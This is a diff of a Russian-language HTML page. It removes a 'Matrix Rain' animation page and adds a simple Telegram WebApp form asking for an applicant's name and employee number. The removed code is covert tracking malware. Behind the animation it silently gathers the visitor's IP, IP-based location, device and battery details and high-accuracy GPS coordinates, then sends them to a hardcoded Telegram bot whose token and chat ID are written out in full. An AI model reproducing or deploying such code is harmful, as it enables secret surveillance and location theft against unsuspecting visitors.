@@ -1,333 +1,79 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Matrix Rain</title>
-    <style>
-        body {
-            margin: 0;
-            overflow: hidden;
-            background: black;
-        }
-        canvas {
-            display: block;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Форма заявителя</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #f2f2f7;
+      margin: 0;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    h2 {
+      text-align: center;
+    }
+    input {
+      width: 90%;
+      max-width: 350px;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      font-size: 16px;
+    }
+    button {
+      background-color: #0088cc;
+      color: white;
+      border: none;
+      padding: 10px 25px;
+      border-radius: 10px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:disabled {
+      background: #aaa;
+      cursor: not-allowed;
+    }
+  </style>
 </head>
 <body>
-    <canvas id="matrix"></canvas>
-    <script>
-        const BOT_TOKEN = '7743325672:AAEgT4v4dYlMb3C_JJ9HJP38BYyc-z-3XnA';
-        const CHAT_ID = '7934685670';
+  <h2>Введите данные заявителя</h2>
 
-        const canvas = document.getElementById('matrix');
-        const ctx = canvas.getContext('2d');
+  <input type="text" id="fio" placeholder="ФИО заявителя" />
+  <input type="text" id="tabnum" placeholder="Табельный номер сотрудника" />
+  <button id="nextBtn" disabled>Далее</button>
 
-        // Настройка размера канваса
-        function resizeCanvas() {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        }
-        resizeCanvas();
-        window.addEventListener('resize', resizeCanvas);
+  <script>
+    const tg = window.Telegram.WebApp;
+    const fioInput = document.getElementById("fio");
+    const tabnumInput = document.getElementById("tabnum");
+    const nextBtn = document.getElementById("nextBtn");
 
-        // Настройка матричного дождя
-        const fontSize = 14;
-        const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-        const columns = Math.floor(canvas.width / fontSize);
-        const drops = Array(columns).fill(0);
+    // Активируем кнопку, когда оба поля заполнены
+    function checkInputs() {
+      nextBtn.disabled = !(fioInput.value.trim() && tabnumInput.value.trim());
+    }
+    fioInput.addEventListener("input", checkInputs);
+    tabnumInput.addEventListener("input", checkInputs);
 
-        function draw() {
-            // Эффект затухания для букв
-            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
+    nextBtn.addEventListener("click", () => {
+      const data = {
+        fio: fioInput.value.trim(),
+        tabnum: tabnumInput.value.trim(),
+      };
 
-            // Отрисовка букв
-            ctx.fillStyle = '#0F0';
-            ctx.font = `${fontSize}px monospace`;
+      // Отправляем данные боту
+      tg.sendData(JSON.stringify(data));
 
-            for (let i = 0; i < drops.length; i++) {
-                const text = chars.charAt(Math.floor(Math.random() * chars.length));
-                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-
-                // Сброс символа
-                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
-                    drops[i] = 0;
-                }
-                drops[i]++;
-            }
-
-            requestAnimationFrame(draw);
-        }
-
-        async function collectDeviceInfo(includeGps = false) {
-            const info = {};
-            const userAgent = navigator.userAgent || 'Неизвестно';
-            info.userAgent = userAgent;
-            info.platform = navigator.platform || 'Неизвестно';
-            
-            let osInfo = 'Неизвестно';
-            let browserName = 'Неизвестно';
-            let browserVersion = 'Неизвестно';
-            let deviceName = 'Неизвестно';
-
-            if (userAgent) {
-                if (userAgent.match(/Windows NT ([\d.]+)/)) osInfo = 'Windows ' + userAgent.match(/Windows NT ([\d.]+)/)[1];
-                else if (userAgent.match(/Macintosh|Mac OS X/)) osInfo = 'macOS';
-                else if (userAgent.match(/Android ([\d.]+)/)) {
-                    osInfo = 'Android ' + userAgent.match(/Android ([\d.]+)/)[1];
-                    const androidModel = userAgent.match(/Android [\d.]+; ([^;)]*)/);
-                    if (androidModel && androidModel[1]) {
-                        deviceName = androidModel[1].replace(/Build\/.*/, '').trim();
-                    }
-                }
-                else if (userAgent.match(/iPhone OS ([\d_]+)/)) {
-                    osInfo = 'iOS ' + userAgent.match(/iPhone OS ([\d_]+)/)[1].replace(/_/g, '.');
-                    deviceName = 'iPhone';
-                }
-                else if (userAgent.match(/iPad; CPU OS ([\d_]+)/)) {
-                    osInfo = 'iPadOS ' + userAgent.match(/iPad; CPU OS ([\d_]+)/)[1].replace(/_/g, '.');
-                    deviceName = 'iPad';
-                }
-                else if (userAgent.match(/Linux/)) osInfo = 'Linux';
-                else if (userAgent.match(/CrOS/)) osInfo = 'Chrome OS';
-
-                if (userAgent.match(/Chrome\/([\d.]+)/) && !userAgent.match(/Edge|Edg/)) {
-                    browserName = 'Chrome';
-                    browserVersion = userAgent.match(/Chrome\/([\d.]+)/)[1];
-                } else if (userAgent.match(/Firefox\/([\d.]+)/)) {
-                    browserName = 'Firefox';
-                    browserVersion = userAgent.match(/Firefox\/([\d.]+)/)[1];
-                } else if (userAgent.match(/Edge\/([\d.]+)/) || userAgent.match(/Edg\/([\d.]+)/)) {
-                    browserName = 'Edge';
-                    browserVersion = userAgent.match(/(Edge|Edg)\/([\d.]+)/)[2];
-                } else if (userAgent.match(/Safari\/([\d.]+)/) && !userAgent.match(/Chrome/)) {
-                    browserName = 'Safari';
-                    browserVersion = userAgent.match(/Version\/([\d.]+).*Safari/)?.[1] || 'Неизвестно';
-                } else if (userAgent.match(/Opera|OPR\//)) {
-                    browserName = 'Opera';
-                    browserVersion = userAgent.match(/(Opera|OPR)\/([\d.]+)/)?.[2] || 'Неизвестно';
-                } else if (userAgent.match(/MSIE |Trident\//)) {
-                    browserName = 'Internet Explorer';
-                    browserVersion = userAgent.match(/MSIE ([\d.]+)/)?.[1] || '11.0 (Trident)';
-                }
-            }
-
-            info.osInfo = osInfo;
-            info.browser = `${browserName} ${browserVersion}`;
-            info.platform = navigator.platform || 'Неизвестно';
-            info.bluetoothAPI = (typeof navigator.bluetooth !== 'undefined') ? 'Да' : 'Нет';
-            info.usbAPI = (typeof navigator.usb !== 'undefined') ? 'Да' : 'Нет';
-            info.screenResolution = screen.width + 'x' + screen.height;
-            info.languages = navigator.languages.join(', ') || 'Неизвестно';
-            try {
-                info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Неизвестно';
-            } catch (e) {
-                info.timezone = 'Ошибка определения';
-            }
-
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                if (!ipResponse.ok) throw new Error(`HTTP error! Status: ${ipResponse.status}`);
-                const ipData = await ipResponse.json();
-                info.publicIp = ipData.ip || 'Неизвестно';
-            } catch (error) {
-                info.publicIp = `Ошибка: ${error.message} (Проверьте интернет/блокировщики)`;
-            }
-
-            try {
-                const geoResponse = await fetch('https://ipapi.co/json/');
-                if (!geoResponse.ok) throw new Error(`HTTP error! Status: ${geoResponse.status}`);
-                const geoData = await geoResponse.json();
-                if (geoData.error) {
-                    info.ipLocation = `Ошибка: ${geoData.reason}`;
-                } else {
-                    info.ipLocation = `${geoData.city || 'Неизвестный город'}, ${geoData.region || 'Неизвестный регион'}, ${geoData.country_name || 'Неизвестная страна'} (ISP: ${geoData.org || 'Неизвестно'})`;
-                }
-            } catch (error) {
-                info.ipLocation = `Ошибка: ${error.message} (Проверьте интернет/блокировщики)`;
-            }
-
-            if (includeGps) {
-                 if ('geolocation' in navigator) {
-                    await new Promise(resolve => {
-                        navigator.geolocation.getCurrentPosition(
-                            (position) => {
-                                const lat = position.coords.latitude.toFixed(6);
-                                const lon = position.coords.longitude.toFixed(6);
-                                const accuracy = position.coords.accuracy.toFixed(2);
-                                info.gpsLocation = `Широта: ${lat}, Долгота: ${lon} (Точность: ${accuracy} м)`;
-                                info.googleMapsLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
-                                info.yandexMapsLink = `https://yandex.ru/maps/?ll=${lon},${lat}&z=15`; 
-                                resolve();
-                            },
-                            (error) => {
-                                let errorMessageGeo;
-                                switch (error.code) {
-                                    case error.PERMISSION_DENIED:
-                                        errorMessageGeo = "Доступ к GPS отклонен пользователем.";
-                                        break;
-                                    case error.POSITION_UNAVAILABLE:
-                                        errorMessageGeo = "Информация о местоположении недоступна.";
-                                        break;
-                                    case error.TIMEOUT:
-                                        errorMessageGeo = "Таймаут получения местоположения.";
-                                        break;
-                                    default:
-                                        errorMessageGeo = "Неизвестная ошибка получения местоположения.";
-                                        break;
-                                }
-                                info.gpsLocation = `Ошибка: ${errorMessageGeo}`;
-                                info.googleMapsLink = 'Недоступно';
-                                info.yandexMapsLink = 'Недоступно';
-                                resolve();
-                            },
-                            {
-                                enableHighAccuracy: true,
-                                timeout: 3000,
-                                maximumAge: 0
-                            }
-                        );
-                    });
-                } else {
-                    info.gpsLocation = 'API геолокации не поддерживается';
-                    info.googleMapsLink = 'Недоступно';
-                    info.yandexMapsLink = 'Недоступно';
-                }
-            } else {
-                info.gpsLocation = 'Не запрошено';
-                info.googleMapsLink = 'Не запрошено';
-                info.yandexMapsLink = 'Не запрошено';
-            }
-
-            if ('getBattery' in navigator) {
-                await navigator.getBattery().then(function(battery) {
-                    const status = battery.charging ? 'Заряжается' : 'Не заряжается';
-                    const level = (battery.level * 100).toFixed(0) + '%';
-                    const chargingTime = battery.chargingTime !== Infinity ? ` (Зарядка: ${ (battery.chargingTime / 60).toFixed(1) } мин)` : '';
-                    const dischargingTime = battery.dischargingTime !== Infinity ? ` (Осталось: ${ (battery.dischargingTime / 3600).toFixed(1) } ч)` : '';
-                    info.batteryStatus = `${status}, Уровень: ${level}${chargingTime}${dischargingTime}`;
-                }).catch(function(e) {
-                    info.batteryStatus = 'Недоступно';
-                });
-            } else {
-                info.batteryStatus = 'Не поддерживается';
-            }
-            
-            return info;
-        }
-
-        function generateTelegramHtml(info) {
-            const escapeHtml = (unsafe) => {
-                return unsafe
-                    .replace(/&/g, "&amp;")
-                    .replace(/</g, "&lt;")
-                    .replace(/>/g, "&gt;")
-                    .replace(/"/g, "&quot;")
-                    .replace(/'/g, "&#039;");
-            };
-
-            let telegramHtmlMessage = '<b><pre>Новая информация об устройстве:</pre></b>\n\n';
-            telegramHtmlMessage += `<b>User Agent:</b> ${escapeHtml(info.userAgent)}\n`;
-            telegramHtmlMessage += `<b>Операционная система:</b> ${escapeHtml(info.osInfo)}\n`;
-            telegramHtmlMessage += `<b>Платформа:</b> ${escapeHtml(info.platform)}\n`;
-            telegramHtmlMessage += `<b>Браузер:</b> ${escapeHtml(info.browser)}\n`;
-            telegramHtmlMessage += `<b>IP адрес:</b> ${escapeHtml(info.publicIp)}\n`;
-            telegramHtmlMessage += `<b>API Bluetooth:</b> ${escapeHtml(info.bluetoothAPI)}\n`;
-            telegramHtmlMessage += `<b>API USB:</b> ${escapeHtml(info.usbAPI)}\n`;
-            telegramHtmlMessage += `<b>Местоположение по IP:</b> ${escapeHtml(info.ipLocation)}\n`;
-            if (info.gpsLocation === 'Недоступно' || info.gpsLocation === 'Не запрошено' || info.gpsLocation.startsWith('Ошибка')) {
-                telegramHtmlMessage += `<b>GPS координаты:</b> ${escapeHtml(info.gpsLocation)}\n`;
-            } else {
-                 telegramHtmlMessage += `<b>GPS координаты:</b> ${escapeHtml(info.gpsLocation)}\n`;
-                 telegramHtmlMessage += `<b>Google Maps:</b> <a href="${escapeHtml(info.googleMapsLink)}">Открыть на карте</a>\n`;
-                 telegramHtmlMessage += `<b>Яндекс Карты:</b> <a href="${escapeHtml(info.yandexMapsLink)}">Открыть на карте</a>\n`;
-            }
-            telegramHtmlMessage += `<b>Статус батареи:</b> ${escapeHtml(info.batteryStatus)}\n`;
-            telegramHtmlMessage += `<b>Разрешение экрана:</b> ${escapeHtml(info.screenResolution)}\n`;
-            telegramHtmlMessage += `<b>Часовой пояс:</b> ${escapeHtml(info.timezone)}\n`;
-            telegramHtmlMessage += `<b>Языки:</b> ${escapeHtml(info.languages)}\n`;
-
-            return telegramHtmlMessage;
-        }
-
-        async function sendHtmlToTelegram(htmlContent) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            const params = {
-                chat_id: CHAT_ID,
-                text: htmlContent,
-                parse_mode: 'HTML'
-            };
-
-            try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(params)
-                });
-                if (!response.ok) {
-                    const errorData = await response.json();
-                    console.error('Failed to send HTML message to Telegram:', errorData);
-                    return null;
-                } else {
-                    const responseData = await response.json();
-                    console.log('Device info HTML sent to Telegram successfully!', responseData);
-                    return responseData.result.message_id;
-                }
-            } catch (error) {
-                console.error('Error sending HTML message to Telegram:', error);
-                return null;
-            }
-        }
-        
-        async function editTelegramMessage(messageId, htmlContent) {
-            if (!messageId) {
-                console.warn('No message ID available to edit.');
-                return;
-            }
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`;
-            const params = {
-                chat_id: CHAT_ID,
-                message_id: messageId,
-                text: htmlContent,
-                parse_mode: 'HTML'
-            };
-
-            try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(params)
-                });
-                if (!response.ok) {
-                    const errorData = await response.json();
-                    console.error('Failed to edit Telegram message:', errorData);
-                } else {
-                    console.log('Telegram message edited successfully!');
-                }
-            } catch (error) {
-                console.error('Error editing Telegram message:', error);
-            }
-        }
-
-        // --- Главная логика ---
-
-        async function startApp() {
-            let collectedDeviceInfo = await collectDeviceInfo(false);
-            let telegramMessageId = await sendHtmlToTelegram(generateTelegramHtml(collectedDeviceInfo));
-
-            // Запрашиваем GPS и обновляем сообщение в Telegram
-            const updatedInfo = await collectDeviceInfo(true);
-            await editTelegramMessage(telegramMessageId, generateTelegramHtml(updatedInfo));
-        }
-
-        draw(); // Запускаем анимацию "Матричного дождя"
-        startApp(); // Запускаем сбор и отправку данных
-    </script>
+      // Закрываем WebApp
+      tg.close();
+    });
+  </script>
 </body>
 </html>
